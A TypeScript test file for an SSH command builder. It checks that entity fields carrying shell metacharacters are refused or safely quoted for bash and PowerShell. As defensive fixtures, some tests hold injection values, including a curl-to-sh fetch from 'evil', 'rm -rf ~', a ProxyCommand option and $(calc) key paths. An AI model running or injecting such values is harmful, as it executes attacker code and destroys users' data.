import assert from 'node:assert/strict';
import { test } from 'node:test';
import { SshCommandOptions, buildSshCommand, describeSshTarget, isSafeSshHost, isSafeSshUser } from '../sshCommand';
import { EntityMetadata } from '../types';
import { BUILT_IN_DIR, GIT_SSH, pathWith } from './sshPath';

const entity = (over: Partial<EntityMetadata> = {}): EntityMetadata => ({
  id: 'e1',
  name: 'prod',
  host: 'example.com',
  user: 'deploy',
  isSshEnabled: true,
  ...over,
});

/**
 * `host` and `user` are NOT trusted input. An entity arrives from a shared NAS
 * folder (sync merge) or from a colleague's share, and the envelope's GCM tag
 * authenticates the container, not the plausibility of a field inside it. The
 * composed line is then handed to `terminal.sendText(command, true)` — the
 * `true` presses Enter — so an unquoted metacharacter is a local shell running
 * whatever the sender chose, on the click of Connect.
 *
 * `sshKeyPath` was quoted here from the start; `user@host` never was.
 */

test('a host carrying shell metacharacters is refused, not composed', () => {
  assert.equal(buildSshCommand(entity({ host: 'example.com; curl http://evil/x|sh' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'example.com`id`' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'example.com$(id)' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'a.com\nrm -rf ~' })), undefined);
});

test('a user carrying shell metacharacters is refused', () => {
  assert.equal(buildSshCommand(entity({ user: 'root; id' })), undefined);
  assert.equal(buildSshCommand(entity({ user: 'a b' })), undefined);
});

test('a host that would read as an ssh OPTION is refused', () => {
  // Not a shell problem: ssh's own parser takes a leading dash as a flag.
  assert.equal(buildSshCommand(entity({ host: '-oProxyCommand=sh -c id' })), undefined);
  assert.equal(isSafeSshHost('-oProxyCommand=x'), false);
  assert.equal(isSafeSshUser('-l'), false);
});

test('ordinary hosts and users still compose', () => {
  assert.equal(buildSshCommand(entity()), 'ssh deploy@example.com');
  assert.equal(buildSshCommand(entity({ port: 2222 })), 'ssh -p 2222 deploy@example.com');
  assert.equal(buildSshCommand(entity({ host: '82.165.44.219', user: 'root' })), 'ssh root@82.165.44.219');
  assert.equal(isSafeSshHost('sub.domain.example.com'), true);
  assert.equal(isSafeSshHost('192.168.1.10'), true);
  assert.equal(isSafeSshHost('[2001:db8::1]'), true);
  assert.equal(isSafeSshUser('deploy_user-1'), true);
  assert.equal(isSafeSshUser('CORP\\alice'), true, 'Windows domain accounts are legitimate');
  assert.equal('CORP\\alice'.length, 10, 'a real backslash, not an eaten escape');
});

test('describeSshTarget refuses the same values, so no UI shows a forged target', () => {
  assert.equal(describeSshTarget(entity({ host: 'a.com; id' })), undefined);
  assert.equal(describeSshTarget(entity()), 'deploy@example.com');
});

// ---- the connection-manager options (audit D7/B10) ---------------------------

test('with no pin the human line leaves ssh its own default, which ASKS', () => {
  // The distinction B10 turns on: a person in a terminal can be asked, so nothing is forced
  // and ssh prompts. Forcing accept-new here would remove the very question the audit wanted
  // put back. (The agent's exec, which has nobody to ask, keeps accept-new — see
  // sshExecCommand.ts.)
  assert.equal(buildSshCommand(entity()), 'ssh deploy@example.com');
});

test('with a pin the line demands a match against exactly that key', () => {
  const line = buildSshCommand(entity(), 'linux', { knownHostsFile: '/tmp/k/known_hosts' });

  assert.match(line ?? '', /StrictHostKeyChecking=yes/);
  assert.match(line ?? '', /UserKnownHostsFile="\/tmp\/k\/known_hosts"/);
  assert.equal((line ?? '').includes('accept-new'), false);
});

test('a jump host and a forward reach the line through the shared composer', () => {
  const line = buildSshCommand(
    entity({ agentForward: true, portForwards: [{ kind: 'local', bindPort: 5432, host: 'db', hostPort: 5432 }] }),
    'linux',
    { jump: 'me@bastion.example.com' },
  );

  assert.equal(line, 'ssh -J me@bastion.example.com -A -L 5432:db:5432 deploy@example.com');
});

// --- which ssh the line actually names (2026-08-26) ----------------------------------------
//
// `-A` reached this line for months and forwarded nothing on Windows: the word `ssh` resolves
// through PATH, and where Git for Windows is installed that is an MSYS build which cannot open
// the named pipe our agent listens on. The test above asserts the FLAG is composed, which was
// true throughout. See `sshProgram.ts` for the measurement.

test('on Windows a forwarding line names the client that can reach the agent', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'win32', {
    builtInExists: () => true,
    pathProbe: pathWith(),
  });

  assert.equal(line, 'C:/Windows/System32/OpenSSH/ssh.exe -A deploy@example.com');
});

test('...and still does when PATH resolves ssh to GIT first', () => {
  // The state this machine is actually in, and the one T20 exists for: an MSYS `ssh` shadowing the
  // built-in cannot open the named pipe our agent listens on.
  const line = buildSshCommand(entity({ agentForward: true }), 'win32', {
    builtInExists: () => true,
    pathProbe: pathWith(GIT_SSH, BUILT_IN_DIR),
  });

  assert.equal(line, 'C:/Windows/System32/OpenSSH/ssh.exe -A deploy@example.com');
});

test('...and drops to the bare word when PATH already resolves ssh to the built-in', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'win32', {
    builtInExists: () => true,
    pathProbe: pathWith(BUILT_IN_DIR, GIT_SSH),
  });

  assert.equal(line, 'ssh -A deploy@example.com');
});

test('on Windows a line that does not forward keeps the bare word', () => {
  // Nobody is moved off their own client for a connection that never needed ours.
  const line = buildSshCommand(entity({}), 'win32', { builtInExists: () => true });

  assert.equal(line, 'ssh deploy@example.com');
});

test('a Windows install without the built-in still gets a line it can run', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'win32', {
    builtInExists: () => false,
  });

  assert.equal(line, 'ssh -A deploy@example.com');
});

test('off Windows the word is unchanged — PATH was never the problem there', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'linux', {
    builtInExists: () => true,
  });

  assert.equal(line, 'ssh -A deploy@example.com');
});

// --- the destination is a shell word too ----------------------------------------------------
//
// Raised by a consultant reviewing the remote-window change, then measured in a real bash:
//
//   printf '<%s>' CORP\alice@host   ->  <CORPalice@host>     the backslash is eaten
//   printf '<%s>' a$HOME@host       ->  <a/root@host>        the variable is expanded
//
// `isSafeSshUser` allows both `\` and `$` — a Windows domain login is `CORP\alice` — and the
// destination was the one argument pushed onto the line UNQUOTED. It was survivable while every
// composed line went to a Windows shell, where a backslash is literal; the remote-window change
// composes for a POSIX shell, which turns it into connecting as a different user without a word.

test('a domain login survives a POSIX shell — the destination is quoted like every other argument', () => {
  const line = buildSshCommand(
    { id: 'e', name: 'n', isSshEnabled: true, host: 'h.example.com', user: 'CORP\\alice' } as never,
    'linux',
  );

  // The WHOLE line, not a fragment: what matters is the bytes bash will see.
  assert.equal(line, 'ssh "CORP\\\\alice@h.example.com"');
});

test('and a dollar in a login is not an environment lookup', () => {
  const line = buildSshCommand(
    { id: 'e', name: 'n', isSshEnabled: true, host: 'h.example.com', user: 'a$HOME' } as never,
    'linux',
  );

  assert.equal(line, 'ssh "a\\$HOME@h.example.com"');
});

test('an ordinary login gets NO quotes — this line is read and pasted by people', () => {
  // The condition is not a judgement about danger; it asks whether the text survives the round
  // trip unchanged. `ssh "deploy@host"` on every connection is noise charged to everybody for a
  // case almost nobody has.
  const line = buildSshCommand(
    { id: 'e', name: 'n', isSshEnabled: true, host: 'h.example.com', user: 'deploy' } as never,
    'linux',
  );

  assert.match(String(line), /ssh deploy@h\.example\.com$/);
});

// --- the client and the shell are two different machines ------------------------------------
//
// In a WSL window bash parses the line and a WINDOWS ssh.exe runs it, reached through interop at
// /mnt/c. Every other caller has one platform because every other caller has one machine.

test('an explicit program is the first word, and the arguments are still quoted for the SHELL', () => {
  const line = buildSshCommand(
    entity({ sshKeyPath: 'C:\\Users\\me\\AppData\\Roaming\\Code\\keys\\e1.key' }),
    'linux',
    { program: '/mnt/c/Windows/System32/OpenSSH/ssh.exe' },
  );

  // The key path keeps its Windows spelling — this client reads Windows paths — while the
  // backslashes are escaped so bash hands them over unchanged.
  assert.equal(
    line,
    '/mnt/c/Windows/System32/OpenSSH/ssh.exe -i "C:\\\\Users\\\\me\\\\AppData\\\\Roaming\\\\Code\\\\keys\\\\e1.key" deploy@example.com',
  );
});

test('the program override outranks the PATH probe, which is about a different machine', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'linux', {
    program: '/mnt/c/Windows/System32/OpenSSH/ssh.exe',
    builtInExists: () => true,
    pathProbe: pathWith(BUILT_IN_DIR),
  });

  assert.equal(line, '/mnt/c/Windows/System32/OpenSSH/ssh.exe -A deploy@example.com');
});

test('and with no override nothing changed at all', () => {
  assert.equal(buildSshCommand(entity(), 'linux', {}), 'ssh deploy@example.com');
});

test('a domain login on a WINDOWS shell is left alone, where a backslash is literal', () => {
  // The same value, the other shell: quoting it there would change nothing and read worse.
  const line = buildSshCommand(
    { id: 'e', name: 'n', isSshEnabled: true, host: 'h.example.com', user: 'CORP\\alice' } as never,
    'win32',
  );

  assert.match(String(line), /CORP\\alice@h\.example\.com$/);
});

// --- the line is byte-identical to the old builder, except where the Windows quoting fix changes it (PLAN_windows_shell_quoting_injection.md) ---

// C1 compares the builder with literal strings, NOT with itself. Every string below was PRINTED by the builder as it stood
// at commit db450e5 (`git show db450e5:src_vs_code/src/sshCommand.ts`, compiled and run once, outside the repository),
// then pasted. Rows are fixtures, columns are option shapes, per platform.
// A row that differs from db450e5 is named in the comment above it, with the reason.
const FIXTURES: EntityMetadata[] = [
  entity(),
  entity({ port: 2222 }),
  entity({ port: 22 }),
  entity({ user: undefined }),
  entity({ user: 'CORP\\alice' }),
  entity({ user: 'a$HOME' }),
  entity({ sshKeyPath: '/keys/e1.key' }),
  entity({ sshKeyPath: 'C:\\Users\\me\\e1.key', port: 2200 }),
  entity({ sshKeyPath: 'C:\\Users\\my name\\e1.key' }),
  entity({ agentForward: true }),
  entity({ agentForward: true, portForwards: [{ kind: 'local', bindPort: 5432, host: 'db', hostPort: 5432 }] }),
  entity({ host: '[2001:db8::1]' }),
  entity({ host: '82.165.44.219', user: 'root' }),
];

/** Functions, because two shapes carry callbacks. The PATH is pinned so the program word is the same on every machine. */
const OPTION_SHAPES: (() => SshCommandOptions)[] = [
  () => ({ builtInExists: () => false, pathProbe: pathWith() }),
  () => ({ program: 'ssh' }),
  () => ({ program: '/usr/bin/ssh', knownHostsFile: '/kh/known_hosts' }),
  () => ({ program: 'ssh', jump: 'j@b:2200', builtInExists: () => true }),
  () => ({ builtInExists: () => true, pathProbe: pathWith(GIT_SSH, BUILT_IN_DIR) }),
  () => ({ program: 'ssh', knownHostsFile: 'C:\\Users\\me\\kh\\known_hosts' }),
];

const EXPECTED: Record<'win32' | 'linux', string[][]> = {
  win32: [
    // 0: entity()
    [
      'ssh deploy@example.com',
      'ssh deploy@example.com',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 deploy@example.com',
      'ssh deploy@example.com',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 1: port 2222
    [
      'ssh -p 2222 deploy@example.com',
      'ssh -p 2222 deploy@example.com',
      '/usr/bin/ssh -p 2222 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -p 2222 -J j@b:2200 deploy@example.com',
      'ssh -p 2222 deploy@example.com',
      'ssh -p 2222 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 2: port 22
    [
      'ssh deploy@example.com',
      'ssh deploy@example.com',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 deploy@example.com',
      'ssh deploy@example.com',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 3: no user
    [
      'ssh example.com',
      'ssh example.com',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" example.com',
      'ssh -J j@b:2200 example.com',
      'ssh example.com',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" example.com',
    ],
    // 4: user CORP\\alice
    [
      'ssh CORP\\alice@example.com',
      'ssh CORP\\alice@example.com',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" CORP\\alice@example.com',
      'ssh -J j@b:2200 CORP\\alice@example.com',
      'ssh CORP\\alice@example.com',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" CORP\\alice@example.com',
    ],
    // 5: user a$HOME. DIFFERS from db450e5, which printed the destination bare (`ssh a$HOME@example.com`) in all six columns:
    // PowerShell expands `$HOME` in a bare word, so the login was changed on the way. It is now one single-quoted word.
    [
      "ssh 'a$HOME@example.com'",
      "ssh 'a$HOME@example.com'",
      "/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile=\"/kh/known_hosts\" 'a$HOME@example.com'",
      "ssh -J j@b:2200 'a$HOME@example.com'",
      "ssh 'a$HOME@example.com'",
      "ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile=\"C:\\Users\\me\\kh\\known_hosts\" 'a$HOME@example.com'",
    ],
    // 6: sshKeyPath /keys/e1.key
    [
      'ssh -i "/keys/e1.key" deploy@example.com',
      'ssh -i "/keys/e1.key" deploy@example.com',
      '/usr/bin/ssh -i "/keys/e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -i "/keys/e1.key" -J j@b:2200 deploy@example.com',
      'ssh -i "/keys/e1.key" deploy@example.com',
      'ssh -i "/keys/e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 7: sshKeyPath C:\\Users\\me\\e1.key, port 2200
    [
      'ssh -i "C:\\Users\\me\\e1.key" -p 2200 deploy@example.com',
      'ssh -i "C:\\Users\\me\\e1.key" -p 2200 deploy@example.com',
      '/usr/bin/ssh -i "C:\\Users\\me\\e1.key" -p 2200 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -i "C:\\Users\\me\\e1.key" -p 2200 -J j@b:2200 deploy@example.com',
      'ssh -i "C:\\Users\\me\\e1.key" -p 2200 deploy@example.com',
      'ssh -i "C:\\Users\\me\\e1.key" -p 2200 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 8: sshKeyPath with a space
    [
      'ssh -i "C:\\Users\\my name\\e1.key" deploy@example.com',
      'ssh -i "C:\\Users\\my name\\e1.key" deploy@example.com',
      '/usr/bin/ssh -i "C:\\Users\\my name\\e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -i "C:\\Users\\my name\\e1.key" -J j@b:2200 deploy@example.com',
      'ssh -i "C:\\Users\\my name\\e1.key" deploy@example.com',
      'ssh -i "C:\\Users\\my name\\e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 9: agentForward
    [
      'ssh -A deploy@example.com',
      'ssh -A deploy@example.com',
      '/usr/bin/ssh -A -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 -A deploy@example.com',
      'C:/Windows/System32/OpenSSH/ssh.exe -A deploy@example.com',
      'ssh -A -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 10: agentForward + local forward
    [
      'ssh -A -L 5432:db:5432 deploy@example.com',
      'ssh -A -L 5432:db:5432 deploy@example.com',
      '/usr/bin/ssh -A -L 5432:db:5432 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 -A -L 5432:db:5432 deploy@example.com',
      'C:/Windows/System32/OpenSSH/ssh.exe -A -L 5432:db:5432 deploy@example.com',
      'ssh -A -L 5432:db:5432 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@example.com',
    ],
    // 11: host [2001:db8::1]
    [
      'ssh deploy@[2001:db8::1]',
      'ssh deploy@[2001:db8::1]',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@[2001:db8::1]',
      'ssh -J j@b:2200 deploy@[2001:db8::1]',
      'ssh deploy@[2001:db8::1]',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" deploy@[2001:db8::1]',
    ],
    // 12: host 82.165.44.219, user root
    [
      'ssh root@82.165.44.219',
      'ssh root@82.165.44.219',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" root@82.165.44.219',
      'ssh -J j@b:2200 root@82.165.44.219',
      'ssh root@82.165.44.219',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\kh\\known_hosts" root@82.165.44.219',
    ],
  ],
  linux: [
    // 0: entity()
    [
      'ssh deploy@example.com',
      'ssh deploy@example.com',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 deploy@example.com',
      'ssh deploy@example.com',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 1: port 2222
    [
      'ssh -p 2222 deploy@example.com',
      'ssh -p 2222 deploy@example.com',
      '/usr/bin/ssh -p 2222 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -p 2222 -J j@b:2200 deploy@example.com',
      'ssh -p 2222 deploy@example.com',
      'ssh -p 2222 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 2: port 22
    [
      'ssh deploy@example.com',
      'ssh deploy@example.com',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 deploy@example.com',
      'ssh deploy@example.com',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 3: no user
    [
      'ssh example.com',
      'ssh example.com',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" example.com',
      'ssh -J j@b:2200 example.com',
      'ssh example.com',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" example.com',
    ],
    // 4: user CORP\\alice
    [
      'ssh "CORP\\\\alice@example.com"',
      'ssh "CORP\\\\alice@example.com"',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" "CORP\\\\alice@example.com"',
      'ssh -J j@b:2200 "CORP\\\\alice@example.com"',
      'ssh "CORP\\\\alice@example.com"',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" "CORP\\\\alice@example.com"',
    ],
    // 5: user a$HOME
    [
      'ssh "a\\$HOME@example.com"',
      'ssh "a\\$HOME@example.com"',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" "a\\$HOME@example.com"',
      'ssh -J j@b:2200 "a\\$HOME@example.com"',
      'ssh "a\\$HOME@example.com"',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" "a\\$HOME@example.com"',
    ],
    // 6: sshKeyPath /keys/e1.key
    [
      'ssh -i "/keys/e1.key" deploy@example.com',
      'ssh -i "/keys/e1.key" deploy@example.com',
      '/usr/bin/ssh -i "/keys/e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -i "/keys/e1.key" -J j@b:2200 deploy@example.com',
      'ssh -i "/keys/e1.key" deploy@example.com',
      'ssh -i "/keys/e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 7: sshKeyPath C:\\Users\\me\\e1.key, port 2200
    [
      'ssh -i "C:\\\\Users\\\\me\\\\e1.key" -p 2200 deploy@example.com',
      'ssh -i "C:\\\\Users\\\\me\\\\e1.key" -p 2200 deploy@example.com',
      '/usr/bin/ssh -i "C:\\\\Users\\\\me\\\\e1.key" -p 2200 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -i "C:\\\\Users\\\\me\\\\e1.key" -p 2200 -J j@b:2200 deploy@example.com',
      'ssh -i "C:\\\\Users\\\\me\\\\e1.key" -p 2200 deploy@example.com',
      'ssh -i "C:\\\\Users\\\\me\\\\e1.key" -p 2200 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 8: sshKeyPath with a space
    [
      'ssh -i "C:\\\\Users\\\\my name\\\\e1.key" deploy@example.com',
      'ssh -i "C:\\\\Users\\\\my name\\\\e1.key" deploy@example.com',
      '/usr/bin/ssh -i "C:\\\\Users\\\\my name\\\\e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -i "C:\\\\Users\\\\my name\\\\e1.key" -J j@b:2200 deploy@example.com',
      'ssh -i "C:\\\\Users\\\\my name\\\\e1.key" deploy@example.com',
      'ssh -i "C:\\\\Users\\\\my name\\\\e1.key" -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 9: agentForward
    [
      'ssh -A deploy@example.com',
      'ssh -A deploy@example.com',
      '/usr/bin/ssh -A -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 -A deploy@example.com',
      'ssh -A deploy@example.com',
      'ssh -A -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 10: agentForward + local forward
    [
      'ssh -A -L 5432:db:5432 deploy@example.com',
      'ssh -A -L 5432:db:5432 deploy@example.com',
      '/usr/bin/ssh -A -L 5432:db:5432 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@example.com',
      'ssh -J j@b:2200 -A -L 5432:db:5432 deploy@example.com',
      'ssh -A -L 5432:db:5432 deploy@example.com',
      'ssh -A -L 5432:db:5432 -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@example.com',
    ],
    // 11: host [2001:db8::1]
    [
      'ssh deploy@[2001:db8::1]',
      'ssh deploy@[2001:db8::1]',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" deploy@[2001:db8::1]',
      'ssh -J j@b:2200 deploy@[2001:db8::1]',
      'ssh deploy@[2001:db8::1]',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" deploy@[2001:db8::1]',
    ],
    // 12: host 82.165.44.219, user root
    [
      'ssh root@82.165.44.219',
      'ssh root@82.165.44.219',
      '/usr/bin/ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="/kh/known_hosts" root@82.165.44.219',
      'ssh -J j@b:2200 root@82.165.44.219',
      'ssh root@82.165.44.219',
      'ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\\\Users\\\\me\\\\kh\\\\known_hosts" root@82.165.44.219',
    ],
  ],
};

test('C1 the_line_is_byte_identical_to_the_old_builder_except_the_quoting_fix', () => {
  let compared = 0;
  for (const platform of ['win32', 'linux'] as const) {
    assert.equal(EXPECTED[platform].length, FIXTURES.length, `${platform}: a fixture without an expected row`);
    FIXTURES.forEach((fixture, row) => {
      OPTION_SHAPES.forEach((shape, column) => {
        const without = buildSshCommand(fixture, platform, shape());
        assert.equal(without, EXPECTED[platform][row][column], `${platform} fixture ${row} shape ${column}`);
        compared += 1;
      });
    });
  }
  assert.equal(compared, FIXTURES.length * OPTION_SHAPES.length * 2);
});

// ---- the vault-data road into the line the pinned PowerShell parses (E1.S2 review, F1-sweep) ------------------------
//
// `sshKeyPath`, `user` and the jump value are entry data: sync, share and import write them, and nothing validates a key
// path beyond "is a string". On win32 the line is typed into PowerShell, where a DOUBLE-quoted word expands `$(…)`, `$name`
// and the backtick, and ends at U+201C, U+201D and U+201E as well as at the ASCII `"`. Every case below is a value that
// used to run LOCALLY on the click of Connect. The ordinary path keeps its `"…"` spelling (cmd reads it too).

const WIN = { builtInExists: () => false, pathProbe: pathWith() } as const;

test('S1 win32 an_ordinary_key_path_keeps_the_double_quoted_spelling', () => {
  assert.equal(buildSshCommand(entity({ sshKeyPath: "C:\\Users\\O'Brien\\my key" }), 'win32', WIN), `ssh -i "C:\\Users\\O'Brien\\my key" deploy@example.com`);
  assert.equal(buildSshCommand(entity({ sshKeyPath: 'C:\\Users\\a\u2019b\\k' }), 'win32', WIN), `ssh -i "C:\\Users\\a\u2019b\\k" deploy@example.com`, 'a curly SINGLE quote is literal inside a double-quoted word');
});

test('S2 win32 a_key_path_that_a_double_quoted_powershell_word_would_run_is_a_single_quoted_word', () => {
  const cases: readonly (readonly [string, string])[] = [
    ['C:\\k\\$(calc)\\id', "'C:\\k\\$(calc)\\id'"],
    ['C:\\k\\$env:USERNAME', "'C:\\k\\$env:USERNAME'"],
    ['C:\\k\\`id`', "'C:\\k\\`id`'"],
    ['C:\\k\\a"; calc; "', `'C:\\k\\a"; calc; "'`],
    ['C:\\k\\a\u201C; calc; \u201D', "'C:\\k\\a\u201C; calc; \u201D'"],
    ['C:\\k\\a\u201E; calc; \u201E', "'C:\\k\\a\u201E; calc; \u201E'"],
    ["C:\\k\\a$(x)'b", "'C:\\k\\a$(x)''b'"],
    ['C:\\k\\a$(x)\u2019b', "'C:\\k\\a$(x)\u2019\u2019b'"],
  ];
  for (const [path, word] of cases) {
    assert.equal(buildSshCommand(entity({ sshKeyPath: path }), 'win32', WIN), `ssh -i ${word} deploy@example.com`, JSON.stringify(path));
  }
});

test('S3 win32 a_pin_file_path_the_same_way_as_a_key_path_is_one_word', () => {
  assert.equal(
    buildSshCommand(entity(), 'win32', { ...WIN, knownHostsFile: 'C:\\Users\\a$b\\known_hosts' }),
    `ssh -o StrictHostKeyChecking=yes -o 'UserKnownHostsFile=C:\\Users\\a$b\\known_hosts' deploy@example.com`,
  );
  assert.equal(
    buildSshCommand(entity(), 'win32', { ...WIN, knownHostsFile: 'C:\\Users\\me\\known_hosts' }),
    `ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile="C:\\Users\\me\\known_hosts" deploy@example.com`,
  );
});

test('S4 win32 a_dollar_in_a_login_is_not_a_powershell_variable_in_the_destination_or_the_jump_value', () => {
  // `isSafeSshUser` admits `$` (a machine account is `HOST$`), and a bare `a$HOME@host` is expanded by PowerShell.
  assert.equal(buildSshCommand(entity({ user: 'a$HOME' }), 'win32', WIN), "ssh 'a$HOME@example.com'");
  assert.equal(buildSshCommand(entity({ user: 'CORP\\WS01$' }), 'win32', WIN), "ssh 'CORP\\WS01$@example.com'");
  assert.equal(buildSshCommand(entity(), 'win32', { ...WIN, jump: 'a$HOME@bastion:2200' }), "ssh -J 'a$HOME@bastion:2200' deploy@example.com");
  // The ordinary words stay bare, and a domain backslash is literal in PowerShell.
  assert.equal(buildSshCommand(entity({ user: 'CORP\\alice' }), 'win32', { ...WIN, jump: 'j@b:2200' }), 'ssh -J j@b:2200 CORP\\alice@example.com');
});
